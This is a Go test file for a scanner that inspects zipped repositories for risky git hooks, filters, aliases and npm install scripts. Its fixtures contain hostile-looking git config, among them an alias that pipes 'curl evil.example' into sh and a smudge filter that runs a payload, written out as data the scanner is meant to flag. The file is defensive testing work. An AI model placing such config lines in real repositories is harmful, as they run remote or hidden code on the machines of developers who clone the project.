package scan

import (
	"archive/zip"
	"os"
	"path/filepath"
	"testing"
)

func TestIsZipArg(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "repo.zip")
	if err := os.WriteFile(archive, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if !isZipArg(archive) {
		t.Errorf("isZipArg(%q) = false, want true", archive)
	}
	if isZipArg(dir) {
		t.Error("isZipArg on a directory should be false")
	}
	if isZipArg(filepath.Join(dir, "repo.txt")) {
		t.Error("isZipArg on a non-zip file should be false")
	}
}

func TestZipSource(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "repo-main.zip")
	writeZip(t, archive, map[string]string{
		"repo-main/.gitattributes":    "*.bin filter=evil\n",
		"repo-main/package.json":      `{"scripts":{"postinstall":"node x.js"}}`,
		"repo-main/.husky/pre-commit": "#!/bin/sh\necho hi\n",
		"repo-main/README.md":         "hello",
	})

	src, err := newZipSource(archive)
	if err != nil {
		t.Fatal(err)
	}
	defer src.Close()

	var findings []Finding
	scanRemoteSource(src, func(f Finding) { findings = append(findings, f) })

	for _, want := range []string{
		"Attribute binds filter=evil",
		"npm install script: postinstall",
		"Husky hooks directory present",
		"Tracked hook file: pre-commit",
	} {
		if !hasTitle(findings, want) {
			t.Errorf("missing finding %q in %+v", want, findings)
		}
	}

	if got := string(src.file(".gitattributes")); got != "*.bin filter=evil\n" {
		t.Errorf("file(.gitattributes) = %q, want top-level dir stripped", got)
	}
	if src.file("missing.txt") != nil {
		t.Error("file on a missing entry should return nil")
	}
}

func TestZipSourceList(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "repo-main.zip")
	writeZip(t, archive, map[string]string{
		"repo-main/package.json": `{"name":"x"}`,
		"repo-main/src/main.go":  "package main\n",
	})

	src, err := newZipSource(archive)
	if err != nil {
		t.Fatal(err)
	}
	defer src.Close()

	got := src.list()
	if len(got) != 2 || got[0] != "package.json" || got[1] != "src/main.go" {
		t.Errorf("list() = %v", got)
	}
}

func TestZipSourceWithGitDir(t *testing.T) {
	archive := filepath.Join(t.TempDir(), "repo.zip")
	writeZip(t, archive, map[string]string{
		"repo/.git/config": `[core]
	hooksPath = .githooks
[filter "evil"]
	smudge = sh -c .payload
[include]
	path = extra.cfg
`,
		"repo/.git/extra.cfg":                "[alias]\n\tpwn = !curl evil.example | sh\n",
		"repo/.git/hooks/pre-commit":         "#!/bin/sh\nsh .payload\n",
		"repo/.git/hooks/fsmonitor-watchman": "#!/bin/sh\necho watch\n",
		"repo/.git/objects/ab/cdef":          "binary",
		"repo/package.json":                  `{"scripts":{"postinstall":"node x.js"}}`,
		"repo/.githooks/post-checkout":       "#!/bin/sh\necho hi\n",
	})

	src, err := newZipSource(archive)
	if err != nil {
		t.Fatal(err)
	}
	defer src.Close()

	if !src.hasGitDir() {
		t.Fatal("hasGitDir() = false, want true")
	}

	var findings []Finding
	add := func(f Finding) { findings = append(findings, f) }
	scanRemoteSource(src, add)
	src.scanGitDir(add)

	for _, want := range []string{
		"core.hooksPath",
		"filter.evil.smudge",
		"alias.pwn",
		"Active git hook: post-checkout",
		"npm install script: postinstall",
	} {
		if !hasTitle(findings, want) {
			t.Errorf("missing finding %q in %+v", want, findings)
		}
	}
	if hasTitle(findings, "Active git hook: fsmonitor-watchman") {
		t.Error("hooksPath points at .githooks, so .git/hooks must not be scanned")
	}
}

func writeZip(t *testing.T, path string, files map[string]string) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
}
